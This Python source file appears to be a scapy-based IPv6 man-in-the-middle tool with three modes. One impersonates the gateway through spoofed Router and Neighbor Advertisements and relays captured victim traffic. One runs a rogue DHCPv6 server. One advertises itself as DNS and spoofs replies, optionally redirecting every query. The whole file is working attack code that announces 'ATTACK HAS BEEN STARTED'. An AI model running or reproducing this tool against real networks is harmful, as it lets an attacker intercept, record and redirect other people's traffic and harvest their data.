import click
import time
from scapy.all import *
from scapy.all import IPv6,ICMPv6ND_NA,ICMPv6ND_RA,ICMPv6ND_NS,ICMPv6ND_Redirect,ICMPv6NDOptSrcLLAddr,UDP,DHCP6_Advertise,DHCPv6_am,Ether,ICMPv6NDOptRDNSS,RandMAC,DNS,DNSRR,DNSQR,LLMNRQuery,LLMNRResponse,PcapWriter
from scapy.all import send,srp1,sniff,sendp,conf,get_if_hwaddr,read_routes6
import os
import subprocess
import threading
import regex
import dhcpAM
import ipaddress
import random
import socket
import dnsAM as dpc
from clases import Device,vPort

targets = []
myDevice = Device()
gatewayDev = Device()
vPorts = []

dhcpM = DHCPv6_am()

def sendNA(source,destination,interface=conf.iface,S=1):
    p = (IPv6(src=source,dst=destination)/ICMPv6ND_NA(tgt=destination,R=1,S=S,O=0)/ ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr(iff=interface)))
    send(p,iface=interface,verbose=0)

def sendRA(target,port,interface,gw):
    while True:
        send(IPv6(src=gw,dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)
        send(IPv6(src=port.linklocal, dst=target.linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
        print("Sending Router advertisments")
        time.sleep(5)

def Revert(target,port,interface,gw):
        send(IPv6(src=gw,dst=target.linklocal)/ICMPv6ND_RA(),iface=interface,verbose=0)
        send(IPv6(src=port.linklocal, dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0),iface=interface,verbose=0)

def clearRouter(target,gw):
    send(IPv6(src=gw,dst=target)/ICMPv6ND_RA(routerlifetime=0))

def Redirect(target,gw,interface):
    p = (IPv6(src=target,dst=gw)/ICMPv6ND_Redirect(tgt=target,dst=gw))
    send(p,iface=interface, loop=1, inter=0.1,verbose=0)

def get_target_mac(target,interface):
    r = srp1(Ether()/IPv6(src=myDevice.linklocal,dst=target)/ICMPv6ND_NS(tgt=target),iface=interface,verbose=0)
    return r[Ether].src

def forwarder(port):
    target = port.targetDevice
    sniff(filter="ip6 && inbound",prn=forward(target,port))

def forward(target,port):
    def forw(packet):
        if ICMPv6ND_NS in packet and packet[ICMPv6ND_NS].tgt == port.linklocal:
            sendNA(port.linklocal,packet[IPv6].src,S=1)

        elif packet[Ether].src == target.macaddr or packet[IPv6].src == target.linklocal or packet[IPv6].src == target.globalip:
            print(packet.summary())
            port.Write(packet)
            packet[Ether].src = port.macaddr
            packet[Ether].dst = gatewayDev.macaddr
            packet[IPv6].src = port.linklocal
            sendp(packet,iface=conf.iface,verbose=0)

        elif packet[Ether].dst == port.macaddr or packet[IPv6].dst == port.linklocal:
            print(packet.summary())
            port.Write(packet)
            packet[Ether].src = port.macaddr
            packet[Ether].dst = gatewayDev.macaddr
            packet[IPv6].dst = gatewayDev.linklocal
            sendp(packet,iface=conf.iface,verbose=0)
    return forw

def DHCPadvertise(interface,targets = ['ff02::1']):
    while True:
        for target in targets:
            send(IPv6(dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0,M=1,O=1),iface=interface,verbose=0)
            print("Sending Router advertisments")
        time.sleep(5)

def DNSadvertise(interface,targets = ['ff02::1']):
    while True:
        for target in targets:
            send(IPv6(dst=target.linklocal)/ICMPv6ND_RA(routerlifetime=0)/ICMPv6NDOptRDNSS(dns=[myDevice.globalip]),iface=interface,verbose=0)
            print("Sending Router advertisments")
        time.sleep(5)

def matchIPv6(addr):
    try:
        ip = ipaddress.IPv6Address(addr)
        return True
    except:
        return False

#def wellcomeMsg():
#    return("\n___  ________ ________  ___       _____ _____  _____ _     \n|  \/  |_   _|_   _|  \/  |      |_   _|  _  ||  _  | |    \n| .  . | | |   | | | .  . |  ______| | | | | || | | | |    \n| |\/| | | |   | | | |\/| | |______| | | | | || | | | |    \n| |  | |_| |_  | | | |  | |        | | \ \_/ /\ \_/ / |____  by CrumblyBread\n\_|  |_/\___/  \_/ \_|  |_/        \_/  \___/  \___/\_____/\n")

def get_linklocal(interface):
    r = read_routes6()
    for line in r:
        if line[3] == interface and regex.match("^fe80:",line[0]) and matchIPv6(line[0]):
            return(str(line[4][0]))

def get_global(interface):
    r = read_routes6()
    for line in r:
        if line[3] == interface and not regex.match("^fe80:.+",line[0]) and matchIPv6(line[0]):
            return(str(line[4][0]))

def get_target_global(target):
    r = socket.getnameinfo((target,0), 0)
    sendLLMNR(r[0])



def source_in_targets(targets, source):
    for target in targets:
        if target.linklocal == source or target.globalip == source:
            return True
    return False

def get_random_mac():
    rmac = RandMAC()
    #TODO: Add more OUIs
    return "44:38:39" + str(rmac)[8:]

def linklocalFromMAC(mac):
    macs = str(mac).split(":")
    macs.insert(3,"fe")
    macs.insert(3,"ff")
    macs[0] = str(hex(int(macs[0],16) ^ int("2",16)))[2:]
    linklocal="fe80:"
    for x in range(len(macs)):
        if(x % 2 == 0):
            linklocal += ":"
        linklocal +=  macs[x]
    return linklocal

def sendMDNS(hostname):
    trid = random.randint(0,33000)
    p = IPv6(dst="ff02::fb")/UDP(dport=5353)/DNS(id=trid,qd=DNSQR(qtype="AAAA", qname=f"{hostname}.local"))
    send(p)
    while True:
        r = sniff(count=1)
        if DNSRR in r[0] and r[0][DNS].id == trid:
            break
def sendLLMNR(hostname):
    trid = random.randint(0,33000)
    p = IPv6(dst="ff02::1:3")/UDP(dport=5355)/LLMNRQuery(id=trid,qd=DNSQR(qtype="PTR", qname=f"{getReverseDNS(hostname)}"))
    threading.Thread(target=sniffBeforeSend,daemon=True,args=(trid,None)).start()
    time.sleep(0.5)
    send(p)

def sniffBeforeSend(trid,c):
    r = sniff(filter = 'ip6 && inbound',prn=getLLMNRResponse(trid),iface=conf.iface, verbose=0)

def getLLMNRResponse(trID):
    def resp(packet):
        if LLMNRResponse in packet and packet[LLMNRResponse].id == trID:
            return
    return resp


def getReverseDNS(targetIp):
    parts = str(targetIp).split(":")
    while len(parts) <= 8:
        parts.insert(parts.index(''), "0000")
    parts = [part.zfill(4) for part in parts if part != '']
    revIP = ''.join(reversed(''.join(parts)))
    revIP = '.'.join(revIP[i:i+1] for i in range(0, len(revIP), 1))
    return revIP + ".ip6.arpa"

def DHCPanswer(dns,networkAddress,prefix,interface):
    network = ipaddress.ip_network(f"{networkAddress}/{prefix}")
    firstaddress = network.network_address + 1
    lastaddress = network.broadcast_address - 1

    dhcpM = dhcpAM.DHCPv6_am(dns=dns, startip=firstaddress, endip=lastaddress, iface=interface)

    p = sniff(filter=dhcpM.filter,prn=getDhcpAnswer(dhcpM))

def getDhcpAnswer(dhcpM):
    def dhcpAns(packet):
        if source_in_targets(targets,packet[IPv6].src):
            if dhcpM.is_request(packet):
                r = dhcpM.make_reply(packet)
                if Ether not in r:
                    r = Ether(dst=packet[Ether].src)/r
                sendp(r,iface=conf.iface)
                return f"{packet[IPv6].src} is rquesting an address"
            elif DHCP6_Renew in packet and packet[DHCP6OptServerId].duid != dhcpM.duid:
                p = IPv6(dst=packet[IPv6].src)/DHCP6_Reply(trid=packet.trid)/DHCP6OptStatusCode(statuscode=DHCPV6_STATUS_NOBINDING)
                options_to_check = [DHCP6OptServerId, DHCP6OptClientId]
                for option in options_to_check:
                    if option in packet:
                        p /= packet[option]
                sendp(p,iface=conf.iface)
                return f"{packet[IPv6].src} is trying to renew their configuration"
                
    return dhcpAns

def processTargetsFile(targetsfile,interface):
    if not os.path.exists(targetsfile):
        raise LookupError(f"{targetsfile}\nFile with targets does not exist")

    with open(targetsfile) as file:
        lines = [line.rstrip() for line in file]
        for l in lines:
            if matchIPv6(l) and regex.match("^fe80:.+",l):
                dev = Device(l,get_target_global(l),get_target_mac(l,interface))
                targets.append(dev)

def processDnsFile(dnsfile):
    if not os.path.exists(dnsfile):
        raise FileNotFoundError(f"{dnsfile}\nFile with DNS does not exist")

    match = {}

    with open(dnsfile) as file:
        lines = [line.rstrip() for line in file]
        for line in lines:
            words = line.split(" ")
            for x in range(1,len(words)):
                match[words[x].encode("utf-8").lower()] = (f"127.0.0.1",f"{words[0]}")

    return match

def DNSanswer(interface,joker,dnsfile):
    if joker == None:
        joker = False
    elif joker:
        with open(dnsfile) as file:
            lines = [line.rstrip() for line in file]
            jk = lines[0].split(" ")[0]
            if matchIPv6(jk):
                joker = jk

    dnsM = dpc.DNS_am(iface=interface,joker6=joker,match=processDnsFile(dnsfile))

    os.system("sudo ip6tables -I OUTPUT -p icmpv6 --icmpv6-type destination-unreachable -j DROP")

    p = sniff(filter=f"ip6 && inbound",prn=dnsAnswer(dnsM,interface))


def dnsAnswer(dnsM,interface):
    def dnsA(packet):
        if source_in_targets(targets,packet[IPv6].src) and dnsM.is_request(packet):
            r = dnsM.make_reply(packet)
            if Ether not in r:
                r = Ether(dst=packet[Ether].src)/r
            send(r,iface=interface)
            return f"{packet[IPv6].src} sent a Querry"
    return dnsA


@click.group
def mode_commands():
    pass

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface of the network")
@click.option("-T","--TargetsFile", help="File with ll addresses of targets",default=None)
@click.option("-t","--target", help="Target IPv6 address", default=None)
@click.option("-gw", "--gateway", prompt="Enter the default gateway", help="The default gateway to impersonate")
@click.option("-p","-pcap", is_flag=True, help="Write the traffic into a pcap file")
def gateway(target,targetsfile,gateway,interface,p):

    print("Welcome to MITM-tools!")
    #conf.iface = interface
    if not conf.iface.is_valid():
        raise SyntaxError("Interface is not valid")
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    try:
        if subprocess.Popen(['sudo','cat','/proc/sys/net/ipv6/conf/all/forwarding'], stdout = subprocess.PIPE).communicate()[0] == b'1\n':
            os.system("sudo echo '0' | sudo tee -a /proc/sys/net/ipv6/conf/all/forwarding")
    except:
        pass

    print("Device has been configured")

    if targetsfile == None and target == None:
        raise SyntaxError("No valid target found, please use the -t or -T options")
    elif target == None:
        processTargetsFile(targetsfile,interface)
    else:
        #TODO: Get global ip
        d = Device(macaddr = get_target_mac(target,conf.iface), linklocal = target,globalip=get_target_global(target))
        targets.append(d)

    if not matchIPv6(target):
        raise SyntaxError(f"\"{target}\" is not a valid IPv6 address")

    if not matchIPv6(gateway):
        raise SyntaxError(f"\"{gateway}\" is not a valid IPv6 address")

    print("Targets have been configured")

    global gatewayDev
    gatewayDev.macaddr = get_target_mac(gateway,interface)
    gatewayDev.linklocal = gateway

    if not matchIPv6(myDevice.linklocal):
        raise SyntaxError(f"\"{myDevice.linklocal}\" is not a valid IPv6 address")

    for t in targets:
        mac = get_random_mac()
        d = vPort(linklocal=linklocalFromMAC(mac),macaddr=mac)
        d.AddTarget(t,write=p)
        vPorts.append(d)
        sendNA(d.linklocal,t.linklocal,S=0)
        threading.Thread(target=sendRA,daemon=True,args=(t,d,interface,gateway)).start()
        threading.Thread(target=forwarder,daemon=True, args=(d,)).start()
    
    print("Required processes have been started")
    print("ATTACK HAS BEEN STARTED (press any key then enter to quit)")

    input()
    for p in vPorts:
        Revert(p.targetDevice,p,interface=interface,gw=gateway)
    print("Quitting")

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface you want to connect to")
@click.option("-T","--targetsFile", help="Filepath to list of targets to give addresses",type=click.Path())
@click.option("-n", "--networkAddress", help="Network address of pool",default="2001:db9::")
@click.option("-p", "--prefix", help="Prefix length of the pool",default="64")
@click.option("-dns", help="Address of DNS server",default="2001:500::1035")
def dhcp(interface,targetsfile,networkaddress,prefix,dns):
    print("Welcome to MITM-tools!")
    conf.iface = interface
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    print("Device has been configured")

    processTargetsFile(targetsfile,interface)

    print("Targets have been configured")

    threading.Thread(target=DHCPadvertise,daemon=True,args=(interface,targets)).start()
    threading.Thread(target=DHCPanswer,daemon=True,args=(dns,networkaddress,prefix,interface)).start()
    print("Required processes have been started")
    print("ATTACK HAS BEEN STARTED (press any key then enter to quit)")

    input()
    print("Quitting")

@click.command()
@click.option("-i","--interface", prompt="Ineterface for the network", help="Interface you want to connect to")
@click.option("-T","--TargetsFile", prompt="Filepath to the list of targets", help="Filepath to list of targets to provide dns",type=click.Path())
@click.option("-dns","--DnsFile", prompt="Filepath to dns file", help="Filepath to a dns translation file",type=click.Path())
@click.option("-joker", is_flag=True, help="Redirect all queries to the first address in DNS File")
def dns(interface,targetsfile,dnsfile,joker):
    print("Welcome to MITM-tools!")
    conf.iface = interface
    myDevice.linklocal = get_linklocal(interface=conf.iface)
    myDevice.globalip = get_global(interface)
    myDevice.macaddr = get_if_hwaddr(iff=interface)

    print("Device has been configured")

    processTargetsFile(targetsfile,interface)

    print("Targets have been configured")

    threading.Thread(target=DNSadvertise,daemon=True,args=(interface,targets)).start()
    threading.Thread(target=DNSanswer,daemon=True,args=(interface,joker,dnsfile)).start()

    print("Required processes have been started")
    print("ATTACK HAS BEEN STARTED (press any key then enter to quit)")

    input()
    print("Quitting")

def wrt(writer):
    def wrtc(packet):
        packet[0].summary()
        writer.write(packet)
    return wrtc

@click.command()
@click.option("-t","--target", help="Target IPv6 address", default=None)
def helper(target):
    #print("AllRight")
    #conf.iface = "ens33"
    #conf.route6.routes = (r6 for r6 in conf.route6.routes if r6[3] == conf.iface)
    #pcapw = PcapWriter(filename="pcaperino.pcap", append=True)
    #sniff(prn=wrt(pcapw))
    #print(r)
    #sendLLMNR(target)
    #print(ipaddress.ip_network(f"{target}").broadcast_address)
    #print(socket.getnameinfo((target, 0), 0))
    #dev = Device(linklocal=target)
    #get_target_global(dev)
    print(conf.iface)
    p=(IPv6(dst=target)/ICMPv6EchoRequest())
    print(p.show())
    send(p,iface=conf.iface)

mode_commands.add_command(helper)
mode_commands.add_command(gateway)
mode_commands.add_command(dhcp)
mode_commands.add_command(dns)

if __name__ == "__main__":
     mode_commands()
print